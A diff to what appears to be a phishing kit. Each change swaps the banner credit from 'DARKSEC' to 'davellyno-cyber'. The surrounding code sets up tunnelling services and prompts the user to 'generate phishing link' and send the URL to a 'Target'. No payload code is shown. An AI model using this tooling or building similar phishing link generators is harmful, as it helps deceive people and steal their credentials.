@@ -368,8 +368,8 @@ def start_localxpose(port):
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC  \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------"""
+        {0}http://github.com/davellyno-cyber
+        {0}** BY: davellyno-cyber  \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------"""
                   .format(default_palette[0], default_palette[2]))
             print(
                 "\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO Target-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}"
@@ -390,8 +390,8 @@ def start_localxpose(port):
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALXPOSE URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n"""
+        {0}http://github.com/davellyno-cyber
+        {0}** BY:davellyno-cyber ** \n\n-------------------------------\n{0}[ LOCALXPOSE URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n"""
           .format(default_palette[0], default_palette[2]))
     print(
         "\n{0}[{1}*{0}]{0}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:{1}"
@@ -418,8 +418,8 @@ def start_localtunnel(port, npm):
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL  ]{1}!! {0}\n-------------------------------"""
+        {0}http://github.com/davellyno-cyber
+        {0}** BY:davellyno-cyber ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL  ]{1}!! {0}\n-------------------------------"""
           .format(default_palette[0], default_palette[2]))
     print("\n{0}[{1}*{0}]{0}SELECT ANY URL TYPE TO GENERATE PHISHING LINK:{1}".
           format(default_palette[0], default_palette[2]))
@@ -437,8 +437,8 @@ def start_localtunnel(port, npm):
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------"""
+        {0}http://github.com/davellyno-cyber
+        {0}** BY:davellyno-cyber ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------"""
               .format(default_palette[0], default_palette[2]))
         print(
             "\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO Target-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALTUNNEL URL: {2}{4}"
@@ -457,8 +457,8 @@ def start_localtunnel(port, npm):
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------"""
+        {0}http://github.com/davellyno-cyber
+        {0}** BY:davellyno-cyber ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------"""
               .format(default_palette[0], default_palette[2]))
         print("{0}error[invalid/preoccupied]{0}".format(default_palette[0]))
         start_localtunnel(port, npm)
@@ -514,8 +514,8 @@ def start_openport(port):
 	    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
 	    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
 	    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-	    {0}http://github.com/darksecdevelopers
-	    {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------"""
+	    {0}http://github.com/davellyno-cyber
+	    {0}** BY:davellyno-cyber ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------"""
               .format(default_palette[0], default_palette[4]))
         print(
             "\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO Target-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}{4}\n"
@@ -525,8 +525,8 @@ def start_openport(port):
     print("""{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
 		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
 		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-		{0}http://github.com/darksecdevelopers
-		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------"""
+		{0}http://github.com/davellyno-cyber
+		{0}** BY:davellyno-cyber ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------"""
           .format(default_palette[0], default_palette[2]))
     if 256 == run_command("which openport > /dev/null"):
         run_command("clear")
@@ -548,8 +548,8 @@ def start_pagekite(port):
 		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
 		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
 		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-		{0}http://github.com/darksecdevelopers
-		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PAGEKITE SERVER ]{1}!! {0}\n-------------------------------"""
+		{0}http://github.com/davellyno-cyberu
+		{0}** BY:davellyno-cyber ** \n\n-------------------------------\n{0}[ PAGEKITE SERVER ]{1}!! {0}\n-------------------------------"""
           .format(default_palette[0], default_palette[2]))
     if 256 == run_command("which python2 > /dev/null"):
         print("[*] Python2 not Installed, Pagekite Only Supports Python2!!")
